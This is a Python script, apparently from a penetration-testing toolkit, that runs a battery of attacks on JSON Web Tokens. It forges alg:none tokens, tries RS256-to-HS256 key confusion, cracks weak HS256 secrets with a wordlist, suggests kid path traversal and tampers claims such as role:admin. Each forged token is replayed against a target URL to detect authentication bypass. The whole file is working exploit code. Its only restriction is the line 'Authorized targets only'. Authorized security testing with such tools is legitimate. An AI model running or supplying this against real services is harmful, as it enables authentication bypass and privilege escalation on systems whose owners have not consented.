#!/usr/bin/env python3
"""
Dark Matter — JWT attack battery (technique 5c, re-implemented).

Whenever a hunt observes a JWT, this battery runs the full attack matrix:
  1. alg:none            — strip the signature
  2. alg confusion       — RS256 -> HS256 using the RSA public key as HMAC secret
  3. weak secret crack   — dictionary attack on HS256 secrets
  4. kid traversal       — ../../dev/null and friends
  5. claim tamper        — flip role/id claims, replay, diff responses

Usage:
  jwt-battery.py --token <jwt> [--url <protected-url>] [--wordlist <file>]
  jwt-battery.py --token <jwt> --tamper '{"role":"admin"}' --url <url>

Output: JSON with each attack's result (VULNERABLE / NOT_VULNERABLE / ERROR).
Technique extracted from jwt_tool (ticarpi) — re-implemented, not copied.
Authorized targets only.
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys
import urllib.request
import urllib.error

def b64d(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def split_token(tok):
    parts = tok.strip().split('.')
    if len(parts) != 3:
        raise ValueError('not a JWT (expected 3 parts)')
    header = json.loads(b64d(parts[0]))
    payload = json.loads(b64d(parts[1]))
    return header, payload, parts[2]

def forge(header, payload, key=b''):
    h = b64e(json.dumps(header, separators=(',', ':')).encode())
    p = b64e(json.dumps(payload, separators=(',', ':')).encode())
    alg = header.get('alg', '').upper()
    if alg == 'NONE':
        sig = ''
    elif alg.startswith('HS'):
        bits = int(''.join(filter(str.isdigit, alg)) or 256)
        sig = b64e(hmac.new(key, f'{h}.{p}'.encode(), hashlib.sha256).digest())
    else:
        sig = b64e(b'')
    return f'{h}.{p}.{sig}'

def probe(url, token):
    """Replay the token against the URL; return (status, body_len)."""
    req = urllib.request.Request(url, headers={'Authorization': f'Bearer {token}'})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            body = r.read()
            return r.status, len(body)
    except urllib.error.HTTPError as e:
        return e.code, 0
    except Exception as e:
        return -1, 0

def main():
    ap = argparse.ArgumentParser(description='JWT attack battery')
    ap.add_argument('--token', required=True, help='JWT to attack')
    ap.add_argument('--url', help='Protected URL to replay forged tokens against')
    ap.add_argument('--tamper', help='JSON claims to inject, e.g. {"role":"admin"}')
    ap.add_argument('--wordlist', help='Wordlist for HS256 secret cracking')
    ap.add_argument('--pubkey', help='File with RSA public key (for RS256->HS256 confusion)')
    args = ap.parse_args()

    results = []
    try:
        header, payload, sig = split_token(args.token)
    except Exception as e:
        print(json.dumps({'error': f'token parse failed: {e}'}))
        sys.exit(1)

    orig_alg = header.get('alg', 'unknown')
    results.append({'attack': 'parse', 'result': 'OK',
                    'detail': f'alg={orig_alg} claims={list(payload.keys())}'})

    # Baseline: does the original token work?
    baseline = None
    if args.url:
        baseline = probe(args.url, args.token)
        results.append({'attack': 'baseline', 'result': 'OK' if baseline[0] == 200 else 'INFO',
                        'detail': f'original token -> HTTP {baseline[0]}'})

    # 1. alg:none
    none_tok = forge({'alg': 'none', 'typ': 'JWT'}, payload)
    r = {'attack': 'alg_none', 'result': 'NOT_TESTED', 'detail': f'forged: {none_tok[:40]}...'}
    if args.url:
        st, _ = probe(args.url, none_tok)
        vulnerable = (st == 200 and (baseline is None or baseline[0] != 200)) or \
                     (baseline and baseline[0] == 200 and st == 200)
        # stricter: none-token works at all
        r['result'] = 'VULNERABLE' if st == 200 else 'NOT_VULNERABLE'
        r['detail'] = f'alg:none token -> HTTP {st}'
    results.append(r)

    # 2. RS256 -> HS256 confusion (needs public key)
    if args.pubkey:
        try:
            pubkey = open(args.pubkey, 'rb').read().strip()
            conf_tok = forge({'alg': 'HS256', 'typ': 'JWT'}, payload, pubkey)
            r = {'attack': 'rs256_hs256_confusion', 'result': 'NOT_TESTED',
                 'detail': f'forged: {conf_tok[:40]}...'}
            if args.url:
                st, _ = probe(args.url, conf_tok)
                r['result'] = 'VULNERABLE' if st == 200 else 'NOT_VULNERABLE'
                r['detail'] = f'HS256(pubkey-as-secret) -> HTTP {st}'
            results.append(r)
        except Exception as e:
            results.append({'attack': 'rs256_hs256_confusion', 'result': 'ERROR', 'detail': str(e)})

    # 3. Weak secret dictionary attack (HS256 only)
    if orig_alg.upper().startswith('HS') and args.wordlist:
        try:
            cracked = None
            with open(args.wordlist) as f:
                for line in f:
                    secret = line.strip()
                    if not secret:
                        continue
                    if forge(header, payload, secret.encode()).split('.')[2] == sig:
                        cracked = secret
                        break
            results.append({'attack': 'weak_secret', 'result': 'VULNERABLE' if cracked else 'NOT_VULNERABLE',
                            'detail': f'secret={"'"'" + cracked + "'"'" if cracked else "not found in wordlist"}'})
        except Exception as e:
            results.append({'attack': 'weak_secret', 'result': 'ERROR', 'detail': str(e)})

    # 4. kid traversal probes (report only — server-side effect needs replay)
    kid = header.get('kid')
    if kid:
        results.append({'attack': 'kid_traversal', 'result': 'INFO',
                        'detail': f'kid={kid}; try ../../dev/null, /dev/null, non-existent keys'})
    else:
        results.append({'attack': 'kid_traversal', 'result': 'INFO',
                        'detail': 'no kid header; try injecting kid with traversal'})

    # 5. Claim tamper -> replay -> diff
    if args.tamper and args.url:
        try:
            tamper_claims = json.loads(args.tamper)
            new_payload = {**payload, **tamper_claims}
            tamper_tok = forge({'alg': 'none', 'typ': 'JWT'}, new_payload)
            st, ln = probe(args.url, tamper_tok)
            results.append({'attack': 'claim_tamper', 'result': 'VULNERABLE' if st == 200 else 'NOT_VULNERABLE',
                            'detail': f'tampered {list(tamper_claims.keys())} -> HTTP {st} len={ln}'})
        except Exception as e:
            results.append({'attack': 'claim_tamper', 'result': 'ERROR', 'detail': str(e)})

    vuln_count = sum(1 for r in results if r['result'] == 'VULNERABLE')
    print(json.dumps({'vulnerable': vuln_count, 'results': results}, indent=2))

if __name__ == '__main__':
    main()
